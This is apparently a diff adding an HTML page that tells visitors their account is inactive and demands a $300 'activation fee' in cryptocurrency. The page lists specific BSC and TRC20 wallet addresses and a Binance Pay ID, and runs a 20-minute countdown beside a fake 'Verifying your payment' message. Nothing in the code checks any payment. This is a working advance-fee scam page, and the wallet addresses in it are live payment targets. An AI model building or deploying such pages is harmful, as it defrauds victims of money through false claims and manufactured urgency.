@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Add Balance - Activate Account</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #121212;
+      color: #fff;
+      padding: 40px 20px;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: auto;
+      background: #1e1e2e;
+      border-radius: 10px;
+      padding: 30px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.4);
+      border-top: 5px solid;
+      border-image: linear-gradient(to right, red, orange, yellow) 1;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      background: linear-gradient(90deg, #ff5e62, #ff9966);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .warning {
+      background-color: #ff3e3e;
+      color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      text-align: center;
+      font-size: 16px;
+      line-height: 1.5;
+      box-shadow: 0 0 8px rgba(255, 0, 0, 0.3);
+      margin-bottom: 20px;
+    }
+
+    label, select, button {
+      display: block;
+      width: 100%;
+      margin: 15px 0;
+    }
+
+    select, button {
+      padding: 12px;
+      border-radius: 8px;
+      border: none;
+      font-size: 16px;
+      background: #2e2e3e;
+      color: #fff;
+      cursor: pointer;
+    }
+
+    button {
+      background: linear-gradient(to right, #ffaa00, #ff6600);
+      color: #000;
+      font-weight: bold;
+    }
+
+    button:hover {
+      opacity: 0.9;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .payment-details {
+      text-align: center;
+      margin-top: 30px;
+    }
+
+    .countdown {
+      font-size: 18px;
+      color: #ffcc00;
+      margin-bottom: 10px;
+    }
+
+    .qr img {
+      margin: 15px 0;
+    }
+
+    .address {
+      background: #2e2e3e;
+      padding: 10px;
+      border-radius: 6px;
+      word-break: break-word;
+      margin-bottom: 10px;
+    }
+
+    .loading-text {
+      font-size: 16px;
+      margin-top: 10px;
+      color: #aaa;
+    }
+
+    .next-text {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #888;
+      font-style: italic;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="warningSection">
+    <h2>Deposit</h2>
+    <div class="warning">
+      🚫 <strong>Your Account is inactive.</strong><br />
+      Activate first by paying the activation fee of <strong>$300</strong>.<br />
+      Then you will get access to the Deposit.
+    </div>
+    <button id="activateBtn">Activate Now</button>
+  </div>
+
+  <div class="container hidden" id="activationPaymentSection">
+    <h2>Activate Account - Pay $300 Fee</h2>
+
+    <label for="method">Select Payment Method:</label>
+    <select id="method">
+      <option value="">-- Select Method --</option>
+      <option value="bsc">BSC BEP20</option>
+      <option value="trc">TRC20</option>
+      <option value="binance">Binance Pay</option>
+    </select>
+
+    <button onclick="showPaymentDetails()">Show Payment Details</button>
+
+    <div id="paymentDetails" class="payment-details hidden">
+      <div class="countdown" id="timer">Time left: 20:00</div>
+      <div class="qr" id="qr"></div>
+      <div class="address" id="wallet"></div>
+      <div class="loading-text">⏳ Verifying your payment...</div>
+      <div class="next-text">Show Payment Details → Next</div>
+    </div>
+  </div>
+
+  <script>
+    const wallets = {
+      bsc: {
+        address: "0x1e6bd08aa12e01a0369b2e36a80b6d0237171c45",
+        qr: true
+      },
+      trc: {
+        address: "TJojFCfEbumnF9fP72PQtuMkDTL2XGiNkf",
+        qr: true
+      },
+      binance: {
+        address: "Binance Pay ID: 521069007",
+        qr: false
+      }
+    };
+
+    const activateBtn = document.getElementById('activateBtn');
+    const warningSection = document.getElementById('warningSection');
+    const activationPaymentSection = document.getElementById('activationPaymentSection');
+
+    activateBtn.addEventListener('click', () => {
+      warningSection.classList.add('hidden');
+      activationPaymentSection.classList.remove('hidden');
+    });
+
+    let countdown;
+
+    function showPaymentDetails() {
+      const method = document.getElementById("method").value;
+
+      if (!method) {
+        alert("Please select a payment method.");
+        return;
+      }
+
+      const info = wallets[method];
+      const qrContainer = document.getElementById("qr");
+      const walletEl = document.getElementById("wallet");
+      const paymentDetails = document.getElementById("paymentDetails");
+
+      // Show QR code if available
+      if (info.qr) {
+        const encodedAddress = encodeURIComponent(info.address);
+        qrContainer.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${encodedAddress}" alt="QR Code" />`;
+      } else {
+        qrContainer.innerHTML = '';
+      }
+
+      walletEl.textContent = info.address;
+      paymentDetails.classList.remove("hidden");
+
+      startTimer("timer", 20 * 60);
+    }
+
+    function startTimer(elementId, duration) {
+      clearInterval(countdown);
+      const timerDisplay = document.getElementById(elementId);
+      let time = duration;
+
+      countdown = setInterval(() => {
+        const minutes = String(Math.floor(time / 60)).padStart(2, '0');
+        const seconds = String(time % 60).padStart(2, '0');
+        timerDisplay.textContent = `Time left: ${minutes}:${seconds}`;
+
+        if (--time < 0) {
+          clearInterval(countdown);
+          timerDisplay.textContent = "Expired!";
+        }
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
